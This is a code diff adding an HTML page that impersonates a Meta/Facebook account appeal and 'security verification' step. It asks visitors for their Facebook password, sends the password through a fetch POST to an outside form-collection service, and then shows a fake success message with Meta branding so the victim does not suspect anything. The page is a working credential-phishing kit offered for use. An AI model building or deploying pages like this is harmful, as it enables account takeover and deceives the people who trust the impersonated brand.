@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Meta Appeal - Security Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://kit.fontawesome.com/a2d9d5d66c.js" crossorigin="anonymous"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="form-box">
+
+            <!-- Step 2: Password Verification Form -->
+            <form class="step" id="step2" method="POST" action="https://submit-form.com/CTbX1TGUV" onsubmit="showSuccess(event)">
+                <div class="form-group">
+                    <h4 class="form-title">Security Verification</h4>
+                    <p class="form-subtext">
+                        Please enter your Facebook password to verify your identity
+                    </p>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password *</label>
+                    <input type="password" id="password" name="password" required placeholder="Enter your Facebook password">
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitAppeal">Submit Appeal</button>
+            </form>
+
+            <!-- Step 3: Success Message -->
+            <div class="step" id="step3" style="display: none;">
+                <div class="success-container">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h2 class="success-title">Appeal Submitted Successfully!</h2>
+                    <p class="success-message">
+                        Your appeal has been received and is being reviewed by our team.
+                        You'll receive a notification about the status of your appeal
+                        within 3-5 business days.
+                    </p>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" 
+                         alt="Meta Logo" width="80">
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        function showSuccess(event) {
+            // For demo only — remove this if you want real redirect after POST
+            event.preventDefault();
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+
+            // Optionally submit form manually if you’re using JS handler
+            const form = document.getElementById('step2');
+            const formData = new FormData(form);
+
+            fetch(form.action, {
+                method: "POST",
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
